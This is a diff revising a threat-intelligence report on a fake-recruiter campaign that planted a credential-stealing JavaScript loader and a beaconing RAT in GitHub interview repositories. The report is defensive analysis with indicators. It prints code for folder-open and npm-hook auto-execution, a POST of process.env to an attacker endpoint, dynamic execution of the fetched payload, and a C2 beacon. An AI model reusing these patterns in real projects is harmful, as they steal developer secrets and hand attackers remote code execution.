@@ -2,7 +2,7 @@
 title: "Japanese-Royal: Environment Harvesting and JavaScript RAT Delivered via Fake Developer Interview"
 date: 2026-02-25
 author: "ThreatProphet"
-description: "Analysis of a fake recruiter campaign targeting blockchain developers via LinkedIn, delivering a multi-stage JavaScript RAT through a malicious GitHub repository with four distinct execution triggers."
+description: "Analysis of a fake recruiter campaign targeting blockchain developers via LinkedIn, delivering environment exfiltration and a multi-stage JavaScript RAT through malicious GitHub repositories."
 tags:
   - contagious-interview
   - javascript
@@ -18,11 +18,20 @@ categories:
 tlp: "CLEAR"
 mitre_techniques:
   - T1566.003
+  - T1204.002
   - T1059.007
+  - T1059.004
+  - T1059.003
   - T1071.001
   - T1027
   - T1552.001
   - T1119
+  - T1082
+  - T1016
+  - T1571
+  - T1585.001
+  - T1585.002
+  - T1583.001
 report_id: "TP-2026-002"
 showToc: true
 ---
@@ -31,13 +40,28 @@ showToc: true
 
 ## Executive Summary
 
-A threat actor operating a fake recruiter persona on LinkedIn approached developers with a CTO-level opportunity at a fabricated Japanese e-commerce company. After establishing credibility through a polished project brief, the actor shared a GitHub repository named **Japanese-Royal** as part of a technical interview, directing the target to review and run the codebase. The repository contained a multi-stage implant with four independent execution triggers, any one of which was sufficient to compromise the victim.
+A threat actor operating a fake recruiter persona on LinkedIn approached developers with a CTO-level opportunity at a fabricated Japanese e-commerce company. After establishing credibility through a polished project brief, the actor shared a GitHub repository named **Japanese-Royal** as part of a technical interview, directing the target to review and run the codebase. The repository contained a multi-stage implant reachable through several routine developer actions, including VS Code folder-open tasks, npm lifecycle hooks, normal startup scripts, and direct server execution.
 
-The campaign's most operationally notable characteristic is its credential harvesting gate. Before delivering a Stage 2 beacon payload, Stage 1 POSTs the victim's complete `process.env` snapshot to an actor-controlled Vercel endpoint. This snapshot includes the actor's own planted variables from `frontend/.env` and `frontend/.env.local`, as well as any real credentials the victim has loaded into their environment - AWS keys, API tokens, database strings, or any other secrets present at runtime. The Stage 1 endpoint applies selective gating confirmed through direct testing: the gate condition is satisfied by the combined presence of variables from both planted files. A request without those values returns a benign decoy response. This means payload delivery does not require a victim to have real credentials - any developer who runs the repository will receive the Stage 2 loader, since dotenv loads the planted files automatically. Any real credentials in the victim's environment are exfiltrated as a side effect. The actor profits from the intrusion even if the victim terminates the process before Stage 2 establishes persistence - the environment snapshot is exfiltrated before any payload is requested.
+The campaign's most operationally notable characteristic is its credential harvesting gate. Before delivering a Stage 2 beacon payload, Stage 1 POSTs the victim's complete `process.env` snapshot to an actor-controlled Vercel endpoint. This snapshot includes the actor's own planted variables from `frontend/.env` and `frontend/.env.local`, as well as any real credentials the victim has loaded into their environment - AWS keys, API tokens, database strings, or any other secrets present at runtime. The Stage 1 endpoint applies selective gating confirmed through direct testing: the gate condition is satisfied by the combined presence of variables from both planted files. A request without those values returns a benign decoy response. This means payload delivery does not require a victim to have real credentials: a developer who runs the repository in the expected project workflow can receive the Stage 2 loader once the planted environment files are loaded. Any real credentials in the victim's environment are exfiltrated as a side effect. The actor profits from the intrusion even if the victim terminates the process before Stage 2 establishes persistence - the environment snapshot is exfiltrated before any payload is requested.
 
-Once active, the Stage 2 implant fingerprints the host and beacons every five seconds to a hardcoded C2 server, awaiting arbitrary JavaScript tasking. A second repository under the same GitHub account - **Betfin** - was identified sharing the identical implant structure, a separate but structurally equivalent Stage 1 endpoint, and byte-for-byte identical `.env.local` bait secrets, confirming an active multi-lure campaign.
+Once active, the Stage 2 implant fingerprints the host and beacons every five seconds to a hardcoded C2 server, awaiting arbitrary JavaScript tasking. A second repository under the same GitHub account - **Betfin** - was identified using the same environment-exfiltration and dynamic-loader pattern, a separate but structurally equivalent Stage 1 endpoint, and byte-for-byte identical `.env.local` bait secrets. Its execution surface differs from Japanese-Royal, which indicates reuse of a common implant pattern across lure-specific project structures rather than a byte-for-byte repository clone.
 
-TTPs are consistent with **Lazarus Group / Contagious Interview** activity documented since 2023, though attribution is assessed at **low-to-medium confidence** based on TTP overlap alone.
+TTPs are consistent with **DPRK-linked Contagious Interview-aligned** activity documented since 2023, though attribution is assessed at **low-to-medium confidence** based on TTP overlap rather than independently confirmed operator identity.
+
+---
+
+## Evidence Basis and Scope
+
+This report is based on preserved repository mirrors, captured Stage 1 and Stage 2 payloads, Git commit metadata, DNS/WHOIS records, hash manifests, and controlled endpoint testing performed during the original investigation. The underlying evidence archive is not distributed with this public report; reproducibility is supported through SHA-256 hashes, repository names, commit metadata, observable code patterns, and network indicators.
+
+Analytical statements in this report are separated into four categories:
+
+- directly observed code behavior, including package scripts, VS Code task configuration, environment exfiltration, and dynamic JavaScript execution;
+- captured infrastructure behavior, including Stage 1 decoy and loader responses and the Stage 2 C2 idle response;
+- repository-cluster correlation based on shared files, lure themes, Git author metadata, and endpoint naming patterns;
+- attribution assessment based on tradecraft overlap with public reporting on DPRK-linked Contagious Interview activity.
+
+Attribution should be read as campaign alignment, not as a claim that the real-world operator identity has been independently established.
 
 ---
 
@@ -53,13 +77,13 @@ The GitHub repository was shared separately during the interview conversation, p
 
 ### Repository Cluster
 
-Five repositories were identified across three GitHub accounts, all containing the same malicious implant pattern or sharing lure themes with the primary repository:
+Five repositories were identified across three GitHub accounts, containing either the same malicious exfiltration/loader pattern or closely related lure themes:
 
 | GitHub Account | Repository | Notes |
 |---|---|---|
 | `0xroaman-1` | `Japanese-Royal` | Primary lure repository, subject of this report |
-| `0xroaman-1` | `Betfin` | Secondary lure, identical implant structure |
-| `0xroaman-2` | `Royal` | Lure repository, same implant pattern |
+| `0xroaman-1` | `Betfin` | Secondary lure, same exfiltration/loader pattern with different trigger surface |
+| `0xroaman-2` | `Royal` | Lure repository, same theme/cluster pattern |
 | `0xroaman-2` | `Betfin` | Duplicate lure theme across accounts |
 | `0xroaman-4` | `Betfin` | Empty at time of analysis - possibly cleaned up |
 
@@ -67,16 +91,25 @@ The "Betfin" lure theme appears across all three accounts. The "Royal" theme app
 
 All repositories with commits share byte-for-byte identical `.env.local` files (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`), confirming a common credential harvesting template reused across the full cluster.
 
+Preserved repository HEAD metadata supports the timeline and repository-cluster assessment:
+
+| Repository | HEAD commit | Git author | Commit date | Subject |
+|---|---|---|---|---|
+| `0xroaman-1/Japanese-Royal` | `c4ef41c4911b8d2869905bae62d519c96ded0c43` | `0xroaman-6 <0xsoftbuild+3[@]gmail[.]com>` | 2026-01-24T12:51:36+02:00 | `fix final API connection issue reset final outpoint` |
+| `0xroaman-1/Betfin` | `61c3810d02431e6a3f94ce5c3119a17e42359056` | `0xroaman-6 <0xsoftbuild+3[@]gmail[.]com>` | 2026-01-23T13:59:57+02:00 | `update poker game logic flow feature fix authenticator issue` |
+| `0xroaman-2/Betfin` | `0597ece5b59d2bbe06e59f49f28601c08ca8decd` | `0xroaman-2 <luis[@]commerce-media[.]org>` | 2026-02-04T09:25:00+01:00 | `update for normal function mc` |
+| `0xroaman-4/Royal` | `75d715d100deca05da0b75f4aa5f1b0f151e1242` | `0xbuild-02 <victoriaknowles903+2[@]gmail[.]com>` | 2026-01-30T23:32:08+02:00 | `update final flow and fix output issue` |
+
 ### Campaign Timeline
 
 | Date | Event |
 |---|---|
 | 2026-01-14 | `commerce-media[.]org` registered via Hostinger |
 | 2026-01-19 | `commerce-media[.]org` updated - likely MX record configuration for operator email |
-| 2026-01-23 | `0xroaman-1/Betfin` committed by `0xroaman-6` (+0200) |
-| 2026-01-24 | `0xroaman-1/Japanese-Royal` committed by `0xroaman-6` (+0200) |
-| 2026-01-30 | `0xroaman-4/Royal` committed by `0xbuild-02` (+0200) |
-| 2026-02-04 | `0xroaman-2/Betfin` and `0xroaman-2/Royal` committed by `0xroaman-2` / `luis@commerce-media[.]org` (+0100) |
+| 2026-01-23 | `0xroaman-1/Betfin` HEAD commit `61c3810d` by `0xroaman-6` (+0200) |
+| 2026-01-24 | `0xroaman-1/Japanese-Royal` HEAD commit `c4ef41c` by `0xroaman-6` (+0200) |
+| 2026-01-30 | `0xroaman-4/Royal` HEAD commit `75d715d` by `0xbuild-02` (+0200) |
+| 2026-02-04 | `0xroaman-2/Betfin` HEAD commit `0597ece` by `0xroaman-2` / `luis[@]commerce-media[.]org` (+0100) |
 | 2026-02-25 | Analysis conducted, C2 active in standby state |
 
 The domain registration on 2026-01-14 predates the first repository commit by eleven days, and the 2026-01-19 update precedes commits by four days. This sequence is consistent with the operator establishing email infrastructure under the fake company identity before building the lure repositories.
@@ -85,7 +118,7 @@ The domain registration on 2026-01-14 predates the first repository commit by el
 
 1. Actor contacts target on LinkedIn with a CTO recruitment pitch and shares a Google Docs project brief for a fabricated company to establish credibility.
 2. During the interview, the actor shares the `0xroaman-1/Japanese-Royal` GitHub repository as a technical assessment.
-3. Victim is compromised through any one of four independent execution triggers (detailed below). No single specific action is required - `npm install`, `npm start`, opening the folder in VS Code, or running any npm lifecycle script is sufficient.
+3. In Japanese-Royal, execution can be reached through several routine developer actions, including VS Code folder-open task execution, `npm start`, local `npm install` through the `prepare` lifecycle hook, or direct execution of the server entry point.
 4. On execution, `api/auth.js` loads and calls `validateApiKey()` at module level, initiating Stage 1.
 5. Stage 1 (`controllers/auth.js`) decodes the Stage 1 endpoint from Base64 stored in `frontend/.env`, then POSTs the victim's complete `process.env` to the endpoint - exfiltrating all runtime secrets including any `.env`-loaded credentials.
 6. The Stage 1 endpoint checks for the combined presence of variables from the actor's planted `frontend/.env` and `frontend/.env.local`. If the gate is satisfied, it returns JavaScript which is executed immediately via `new Function('require', response.data)(require)`, granting full Node.js runtime access.
@@ -98,11 +131,11 @@ The domain registration on 2026-01-14 predates the first repository commit by el
 
 ### Execution Triggers
 
-The repository implements four independent paths to execution, making it unusually resilient against partial defenses. A developer who disables VS Code automatic tasks but runs `npm install` is still compromised. A developer who reviews `tasks.json` and avoids opening the project in VS Code but runs `npm start` is still compromised. All four triggers ultimately execute `server/server.js`, which loads the malicious route module and fires Stage 1.
+Japanese-Royal implements multiple execution paths, making it resilient against partial defenses. A developer who avoids VS Code automatic tasks but runs a local `npm install` in the frontend project can still trigger execution through the npm `prepare` lifecycle hook. A developer who reviews `tasks.json` but runs `npm start` can also trigger the same server entry point. These paths ultimately execute `server/server.js`, which loads the malicious route module and initiates Stage 1. The extracted package scripts show that `npm run dev` is only `next dev`; it is not itself a direct server trigger, although the VS Code task can first invoke `npm install`, which then triggers `prepare`.
 
 **Trigger 1 - VS Code folder open (`tasks.json`)**
 
-`.vscode/tasks.json` defines two chained tasks configured with `runOptions.runOn: "folderOpen"`. Opening the repository folder in VS Code causes both to execute automatically without any user prompt.
+`.vscode/tasks.json` defines a folder-open task named `frontend-nextjs-dev` that runs `npm run dev` and depends on a preceding `frontend-npm-install` task. The install task itself does not contain `runOn: folderOpen`, but it is invoked as a dependency of the folder-open task. In a trusted workspace, or where automatic tasks have already been allowed for the folder, opening the repository in VS Code can therefore execute `npm install` first, which reaches the malicious `prepare` lifecycle hook. VS Code normally prompts before allowing automatic tasks the first time such a folder is opened, so this is best described as abuse of a developer-trust workflow rather than a universal no-prompt execution primitive.
 
 ```json
 {
@@ -128,7 +161,7 @@ The repository implements four independent paths to execution, making it unusual
 "start": "node server/server.js | next dev"
 ```
 
-The pipe operator causes both processes to run simultaneously. The malicious `server/server.js` starts regardless of whether `next dev` succeeds, and any failure of `next dev` does not terminate the implant.
+The shell pipeline starts the malicious `server/server.js` as part of the same command used to launch the legitimate-looking Next.js development server. This hides the server entry point behind an expected developer workflow and makes the malicious process appear coupled to normal project startup.
 
 **Trigger 3 - `npm install` (prepare hook)**
 
@@ -136,11 +169,11 @@ The pipe operator causes both processes to run simultaneously. The malicious `se
 "prepare": "node server/server.js | next dev"
 ```
 
-The `prepare` lifecycle hook fires automatically during `npm install`, before the install completes. Running `npm install` inside `frontend/` - including when triggered automatically by the VS Code task - starts `server/server.js`, loads the malicious route module, and executes Stage 1 in full: environment exfiltration and loader delivery both occur. A developer running `npm install` to audit dependencies before doing anything else is fully compromised before the install finishes.
+The `prepare` lifecycle hook runs during a local `npm install` without package arguments. Running `npm install` inside `frontend/`, including when triggered by the VS Code task, starts `server/server.js`, loads the malicious route module, and executes Stage 1: environment exfiltration and loader delivery occur as part of normal dependency-install workflow. A developer running `npm install` to inspect or audit the project can therefore trigger the implant before intentionally starting the application.
 
 **Trigger 4 - Direct execution**
 
-Any explicit invocation of `node server/server.js` or `npm run dev` (which chains through the server entry point) triggers Stage 1.
+Any explicit invocation of `node server/server.js` triggers Stage 1. The extracted Japanese-Royal `dev` script is `next dev`, so `npm run dev` should not be treated as a direct server trigger unless another project path invokes the backend server separately.
 
 ### Stage 1: Environment Exfiltration and Loader Delivery
 
@@ -174,14 +207,14 @@ async function validateApiKey() {
 `frontend/.env` contains the Base64-encoded Stage 1 endpoint:
 
 ```
-AUTH_API=<base64>   # decodes to: https://ip-check-notification-firebase.vercel[.]app/api
+AUTH_API=<base64>   # decodes to: hxxps://ip-check-notification-firebase.vercel[.]app/api
 ```
 
 The same file contains numerous variables designed to resemble real developer secrets - AWS access keys, Stripe keys, OpenAI API keys, Infura project credentials, and session secrets. These planted variables satisfy the Stage 1 gate condition and will be present in any victim's `process.env` snapshot. Any additional real credentials the victim has loaded into their environment are exfiltrated alongside them.
 
 **Stage 1 selective gating:** The endpoint's gating behavior was confirmed through direct testing. The gate condition is satisfied by the combined presence of variables from both `frontend/.env` and `frontend/.env.local` - the two configuration files planted by the actor in the repository. A request containing only generic environment variables returns the benign decoy response. A request containing the values from both planted files returns the loader payload.
 
-This means the gate is not screening for a victim's real credentials - it is screening for evidence that the victim's Node.js process loaded the actor's own planted files. Any developer who clones the repository and runs it in a completely clean environment with no real secrets will still receive the Stage 2 payload, provided dotenv loaded `.env` and `.env.local` as intended. The bait secrets in those files serve a dual function: they make the exfiltrated environment snapshot appear valuable for credential theft, and they act as the unlock condition for payload delivery.
+This means the gate is not screening for a victim's real credentials. It is screening for evidence that the victim's Node.js process loaded the actor's own planted files. A developer who runs the repository in a clean environment with no real secrets can still receive the Stage 2 payload if the expected `.env` and `.env.local` values are loaded. The bait secrets therefore serve a dual function: they make the exfiltrated environment snapshot appear valuable for credential theft, and they act as the unlock condition for payload delivery.
 
 The decoy response returned to requests that do not satisfy the gate:
 
@@ -223,7 +256,7 @@ async function beacon() {
     };
 
     const response = await axios.get(
-      'http://174.138.188.80:3000/api/errorMessage',
+      'hxxp://174.138.188[.]80:3000/api/errorMessage' // defanged for publication,
       {
         params: {
           sysInfo     : sysInfo,
@@ -269,13 +302,15 @@ When active, the C2 delivers arbitrary JavaScript to the beacon via the `message
 
 ### Betfin: Corroborating Repository
 
-The second repository under `0xroaman-1`, **Betfin**, implements the identical implant pattern. Key structural elements are consistent across both repositories:
+The second repository under `0xroaman-1`, **Betfin**, implements the same environment-exfiltration and dynamic-loader pattern, but its trigger surface is not identical to Japanese-Royal. Key structural elements are consistent across both repositories:
 
-- `AUTH_API` Base64-encoded in `.env`, decoding to a distinct but structurally identical Stage 1 endpoint: `hxxps://ip-checking-notification-pic.vercel[.]app/api`
-- Same `validateApiKey()` module-load execution pattern in `routes/api/auth.js`
-- Same `new Function('require', response.data)(require)` loader in `controllers/auth.js`
-- Byte-for-byte identical `.env.local` (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`) confirming a shared credential harvesting template
-- Same `package.json` trigger scripts
+- `AUTH_API` Base64-encoded in `.env`, decoding to a distinct but structurally equivalent Stage 1 endpoint: `hxxps://ip-checking-notification-pic.vercel[.]app/api`
+- Same `verify(setApiKey(process.env.AUTH_API))` route-load execution pattern in `routes/api/auth.js`
+- Same `axios.post(api, { ...process.env }, ...)` environment exfiltration pattern in `controllers/auth.js`
+- Same `new Function("require", response.data)` loader primitive in the route module
+- Byte-for-byte identical `.env.local` (SHA256: `37eb8e11b40527de0881189064c657fe1623d6b2c8ad16fc8136782e89367ead`) confirming a shared credential-harvesting template
+
+The trigger implementation differs. Betfin's client package contains conventional React scripts, while the repository root contains a `prepare` hook that starts the backend using `start /b node server || nohup node server &`. Betfin's VS Code task file also contains two `runOn: folderOpen` tasks: one runs `npm install --silent --no-progress`, and one runs `node server.js`. This strengthens the cluster assessment because the same implant pattern was adapted to a different application layout rather than copied as a single unchanged project.
 
 The Betfin Stage 1 endpoint subdomain follows the same naming convention as the Japanese-Royal endpoint: both match the pattern `ip-check[ing]-notification-[suffix].vercel.app`. The use of separate endpoints per repository suggests per-lure infrastructure isolation, either for operational security or to allow independent targeting of different victim pools.
 
@@ -285,12 +320,21 @@ The Betfin Stage 1 endpoint subdomain follows the same naming convention as the 
 
 | Technique ID | Name | Tactic | Notes |
 |---|---|---|---|
-| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment lure with Google Docs project brief |
-| T1059.007 | JavaScript | Execution | `new Function('require', payload)(require)` at all stages |
-| T1071.001 | Web Protocols | C2 | Plain HTTP GET beacon to port 3000 every 5 seconds |
-| T1027 | Obfuscated Files or Information | Defense Evasion | Rotating string array obfuscation, Base64-encoded endpoint in `.env` |
-| T1552.001 | Credentials in Files | Credential Access | `process.env` exfiltration including `.env`-loaded secrets |
-| T1119 | Automated Collection | Collection | Full environment snapshot POSTed to Stage 1 endpoint on execution |
+| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn recruitment lure with Google Docs project brief and GitHub repository delivery |
+| T1204.002 | Malicious File | Execution | Victim runs or opens a malicious project as part of a technical assessment |
+| T1059.007 | JavaScript | Execution | `new Function('require', payload)(require)` execution in Node.js |
+| T1059.004 | Unix Shell | Execution | VS Code tasks and npm scripts can launch shell-backed project commands on macOS/Linux |
+| T1059.003 | Windows Command Shell | Execution | Windows task variants use command-shell execution paths where present |
+| T1027 | Obfuscated Files or Information | Defense Evasion | Rotating string-array obfuscation and Base64-encoded Stage 1 endpoint |
+| T1552.001 | Credentials in Files | Credential Access | `.env` and `.env.local` values are loaded into `process.env` and exfiltrated |
+| T1119 | Automated Collection | Collection | Full runtime environment snapshot POSTed to Stage 1 endpoint |
+| T1082 | System Information Discovery | Discovery | Hostname and OS profiling |
+| T1016 | System Network Configuration Discovery | Discovery | Network interface and MAC address enumeration |
+| T1071.001 | Web Protocols | Command and Control | HTTP beaconing to `/api/errorMessage` |
+| T1571 | Non-Standard Port | Command and Control | Plain HTTP C2 on TCP/3000 |
+| T1585.001 | Social Media Accounts | Resource Development | LinkedIn recruiter persona and related social-engineering accounts |
+| T1585.002 | Email Accounts | Resource Development | Git author and lure-domain email artifacts |
+| T1583.001 | Domains | Resource Development | `commerce-media[.]org` registered for the fake company identity |
 
 ---
 
@@ -325,25 +369,27 @@ Both Stage 1 domains are Vercel-hosted and follow the naming convention `ip-chec
 |---|---|---|
 | `commerce-media[.]org` | Domain | Registered 2026-01-14, Hostinger, parked - no live web content |
 | `84.32.84[.]32` | IPv4 | Hostinger shared parking IP, no co-hosted campaign infrastructure identified |
-| `luis@commerce-media[.]org` | Email | Git author identity for `0xroaman-2` commits, domain matches lure company name |
+| `luis[@]commerce-media[.]org` | Email | Git author identity for `0xroaman-2` commits, domain matches lure company name |
 
 The domain `commerce-media[.]org` was registered eleven days before the first repository commit, with a DNS update five days later consistent with MX record configuration. The domain name directly matches the fake company identity ("Commerce Media Inc.") used in the Google Docs lure document, confirming it was purpose-built for this campaign. The operator registered a custom email domain rather than using a free provider for at least one Git identity, representing a deliberate operational preparation step.
 
-### Operator Identity
+### Git Author and Persona Artifacts
 
-Three distinct Git author identities were recovered from commit history across the repository cluster. In all cases the GitHub hosting account name differs from the Git author name configured in commits - a consistent pattern of identity separation between account creation and code development.
+Git author metadata contains both campaign-relevant identities and historical/upstream-looking authors. These values should be treated as operational persona artifacts, not as verified real-world identities. In each case, the repository-hosting account name can differ from the Git author name configured in commits, indicating separation between GitHub account naming and commit identity.
 
-| Git Author Name | Git Author Email | Timezone | Repos | Notes |
+Campaign-relevant HEAD or lure-cluster identities:
+
+| Git Author Name | Git Author Email | Timezone / Context | Repositories | Notes |
 |---|---|---|---|---|
-| `0xroaman-6` | `0xsoftbuild+3@gmail.com` | +0200 | `0xroaman-1/Japanese-Royal`, `0xroaman-1/Betfin` | Primary operator identity |
-| `0xbuild-02` | `victoriaknowles903+2@gmail.com` | +0200 | `0xroaman-4/Royal` | Secondary identity, same timezone |
-| `0xroaman-2` | `luis@commerce-media[.]org` | +0100 | `0xroaman-2/Royal`, `0xroaman-2/Betfin` | Custom domain email, +0100 timezone |
+| `0xroaman-6` | `0xsoftbuild+3[@]gmail[.]com` | +0200 in HEAD commits | `0xroaman-1/Japanese-Royal`, `0xroaman-1/Betfin` | Primary Git author identity for the `0xroaman-1` repositories |
+| `0xbuild-02` | `victoriaknowles903+2[@]gmail[.]com` | +0200 in HEAD commit | `0xroaman-4/Royal` | Secondary Git author identity using the same observed timezone offset |
+| `0xroaman-2` | `luis[@]commerce-media[.]org` | +0100 in HEAD commit | `0xroaman-2/Betfin` | Custom-domain Git author identity matching the lure company domain |
+| `0xroaman-1` | `luiscordes0102+2[@]gmail[.]com` | Historical cluster author | `0xroaman-1/Japanese-Royal` | Additional cluster-linked Git identity; not the HEAD author |
+| `0x-builder`, `0xroaman-7`, `0xtopteam`, `topbuilder5` | `luiscordes*[@]gmail[.]com` variants | Historical cluster authors | `0xroaman-4/Royal` | Additional lure-cluster identities using repeated `luiscordes` naming pattern |
 
-Both Gmail addresses use plus-addressing with numeric tags: `0xsoftbuild+3` and `victoriaknowles903+2`. This convention allows a single Gmail inbox to receive mail for multiple tagged addresses, and is consistent with per-account or per-campaign email management from a shared base identity.
+The history also contains unrelated or upstream-looking authors such as `AbhisheJha1916`, `Anderson`, `Austin Pugh`, `Temple Jett`, and others. Those should not be promoted to operator IOCs unless a specific malicious commit, repository takeover, or direct infrastructure relationship is established.
 
-The `+0200` timezone is consistent across two of the three identities covering four of the five repositories, and across a seven-day commit window (2026-01-23 to 2026-01-30). The third identity (`luis@commerce-media[.]org`) commits at `+0100`. This offset difference may reflect a second operator, a VPN exit node change, or the primary operator in a different timezone during the February commits.
-
-The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follows the pattern of a plausible Western female recruiter persona, consistent with the LinkedIn contact persona "Yorka Morales M." used to approach the target.
+The Gmail addresses use plus-addressing with numeric tags, which may support per-account or per-campaign sorting from a shared inbox. This is an operational clue, but not a reliable attribution marker by itself. The timezone offsets are likewise useful for clustering commit activity, but should not be interpreted as operator geolocation without corroborating evidence.
 
 ### Repository Infrastructure
 
@@ -354,7 +400,7 @@ The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follo
 | `github.com/0xroaman-4` | GitHub Account | Hosts empty Betfin repo |
 | `github.com/0xroaman-1/Japanese-Royal` | Repository | Primary lure |
 | `github.com/0xroaman-1/Betfin` | Repository | Secondary lure |
-| `github.com/0xroaman-2/Royal` | Repository | Lure, same implant pattern |
+| `github.com/0xroaman-2/Royal` | Repository | Lure, same theme/cluster pattern |
 | `github.com/0xroaman-2/Betfin` | Repository | Lure, duplicate theme |
 | `github.com/0xroaman-4/Betfin` | Repository | Empty at time of analysis |
 
@@ -380,13 +426,16 @@ The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follo
 
 | Indicator | Type | Notes |
 |---|---|---|
-| `0xsoftbuild+3@gmail.com` | Email | Git author email, `0xroaman-1` repos, base: `0xsoftbuild@gmail.com` |
-| `victoriaknowles903+2@gmail.com` | Email | Git author email, `0xroaman-4` repos, base: `victoriaknowles903@gmail.com` |
-| `luis@commerce-media[.]org` | Email | Git author email, `0xroaman-2` repos |
+| `0xsoftbuild+3[@]gmail[.]com` | Email | Git author email, `0xroaman-1` repos, base: `0xsoftbuild[@]gmail[.]com` |
+| `victoriaknowles903+2[@]gmail[.]com` | Email | Git author email, `0xroaman-4/Royal`, base: `victoriaknowles903[@]gmail[.]com` |
+| `luis[@]commerce-media[.]org` | Email | Git author email for `0xroaman-2/Betfin`; domain matches lure company name |
+| `luiscordes0102+2[@]gmail[.]com` | Email | Historical Git author in Japanese-Royal; cluster-relevant but not HEAD author |
+| `luiscordes25[@]gmail[.]com`, `luiscordes25+2[@]gmail[.]com`, `luiscordes162+5[@]gmail[.]com`, `luiscordes0102+1[@]gmail[.]com` | Email pattern | Historical Git authors in Royal; cluster-relevant naming pattern |
 | `commerce-media[.]org` | Domain | Registered 2026-01-14, Hostinger, matches lure company name |
-| `0xroaman-6` | Git author name | Commits to `0xroaman-1` repos |
-| `0xbuild-02` | Git author name | Commits to `0xroaman-4` repos |
-| Commit timezone `+0200` | Pattern | Primary across four of five repos |
+| `0xroaman-6` | Git author name | HEAD commits to `0xroaman-1` repos |
+| `0xbuild-02` | Git author name | HEAD commit to `0xroaman-4/Royal` |
+| `0xroaman-2` | Git author name | HEAD commit to `0xroaman-2/Betfin` |
+| Commit timezone `+0200` | Pattern | Observed in `0xroaman-1` and `0xroaman-4` HEAD commits |
 
 ### Repository and Code Indicators
 
@@ -394,12 +443,16 @@ The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follo
 |---|---|---|
 | `github.com/0xroaman-1/Japanese-Royal` | Repository | Primary lure repository |
 | `github.com/0xroaman-1/Betfin` | Repository | Secondary lure |
-| `github.com/0xroaman-2/Royal` | Repository | Lure, same implant pattern |
+| `github.com/0xroaman-2/Royal` | Repository | Lure, same theme/cluster pattern |
 | `github.com/0xroaman-2/Betfin` | Repository | Lure, duplicate theme |
 | `github.com/0xroaman-4/Betfin` | Repository | Empty at time of analysis |
-| `0xroaman-1` | GitHub account | Confirmed operator account |
-| `0xroaman-2` | GitHub account | Confirmed operator account |
-| `0xroaman-4` | GitHub account | Confirmed operator account |
+| `c4ef41c4911b8d2869905bae62d519c96ded0c43` | Commit | Preserved Japanese-Royal HEAD |
+| `61c3810d02431e6a3f94ce5c3119a17e42359056` | Commit | Preserved `0xroaman-1/Betfin` HEAD |
+| `0597ece5b59d2bbe06e59f49f28601c08ca8decd` | Commit | Preserved `0xroaman-2/Betfin` HEAD |
+| `75d715d100deca05da0b75f4aa5f1b0f151e1242` | Commit | Preserved `0xroaman-4/Royal` HEAD |
+| `0xroaman-1` | GitHub account | Repository-hosting account observed in cluster |
+| `0xroaman-2` | GitHub account | Repository-hosting account observed in cluster |
+| `0xroaman-4` | GitHub account | Repository-hosting account observed in cluster |
 | `runOn: folderOpen` in `.vscode/tasks.json` | Code pattern | VS Code auto-execution trigger |
 | `new Function('require', response.data)(require)` | Code pattern | Dynamic execution primitive, all stages |
 | `{ ...process.env }` POST to decoded URL | Code pattern | Environment exfiltration |
@@ -407,9 +460,11 @@ The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follo
 | `exceptionId=env070722` | Beacon parameter | Hardcoded campaign marker |
 | Beacon interval `0x1388` (5000ms) | Code pattern | Stage 2 polling interval |
 
-### File Indicators
+### File and Payload Hashes
 
-| SHA256 | Filename | Notes |
+These hashes are provided for independent comparison with collected samples, repository mirrors, and captured payloads. The underlying evidence archive is not distributed with this report.
+
+| SHA256 | Artifact | Notes |
 |---|---|---|
 | `48c6d172a43919df05ec9f506a1483e4c0fe820ea72092888d77b985aa7109c4` | `.vscode/tasks.json` | VS Code auto-execution config (Japanese-Royal) |
 | `603f46ba670a4be0bcf23429015ab00ccef04dc278bffc2d855eb8de52f9e711` | `frontend/.env` | Contains Base64-encoded Stage 1 endpoint and bait secrets |
@@ -430,27 +485,31 @@ The base name behind `victoriaknowles903@gmail.com` - "Victoria Knowles" - follo
 
 **Assessed confidence: Low-to-Medium**
 
-Several aspects of this campaign overlap with documented Lazarus Group developer-targeting operations, specifically the cluster tracked under the **Contagious Interview** moniker:
+The activity is best described as **DPRK-linked Contagious Interview-aligned** based on tradecraft overlap, not on independently confirmed operator identity. Public reporting on Contagious Interview describes fake recruiter workflows, developer-focused technical assessments, code-repository delivery, JavaScript malware, BeaverTail/InvisibleFerret tooling, and cryptocurrency-adjacent targeting. This report's observed behavior is consistent with that broader activity pattern.
 
-- LinkedIn recruitment lure targeting developers with blockchain and crypto experience - a defining characteristic of Contagious Interview campaigns active since at least 2023
-- Fake technical interview with a GitHub-hosted malicious repository presented as a coding assessment
-- Crypto and Web3 project theming consistent with Lazarus Group's known focus on cryptocurrency-adjacent targets
-- `.vscode/tasks.json` `runOn: folderOpen` auto-execution trigger, a technique documented in multiple prior Contagious Interview variants
-- `new Function('require', payload)(require)` execution primitive - functionally identical to the Stage 2 payload documented in TP-2026-001 and to InvisibleFerret variants reported by Unit42
-- Plain HTTP beacon on TCP/3000 with host fingerprinting (hostname, MACs, OS) and a hardcoded `exceptionId` campaign marker - structural match to TP-2026-001 Stage 2 behavior
-- Vercel-hosted Stage 1 infrastructure consistent with delivery patterns across multiple prior Contagious Interview repositories
+Key overlaps include:
 
-This campaign differs from TP-2026-001 in several respects. Payload staging via Binance Smart Chain smart contract - the technically distinctive element of TP-2026-001 - is absent here. Stage 1 uses a simpler HTTP POST to a Vercel endpoint with environment exfiltration as a primary objective, treating credential harvesting as a goal in its own right rather than incidental to loader delivery. The C2 IP address differs (`174.138.188[.]80` vs `163.245.194[.]216`), and the operator GitHub accounts are distinct. The campaign marker suffixes (`0722` vs `1228`) may reflect different sub-campaigns, operator rotation, or independent actors using shared tooling.
+- LinkedIn recruitment lure targeting a developer with blockchain and management experience;
+- fake technical interview using a GitHub-hosted codebase as the execution vector;
+- crypto/Web3 project theming;
+- `.vscode/tasks.json` `runOn: folderOpen` abuse as one execution path;
+- npm lifecycle/script execution paths that make routine developer commands dangerous;
+- Vercel-hosted Stage 1 infrastructure;
+- obfuscated JavaScript loader and beacon code;
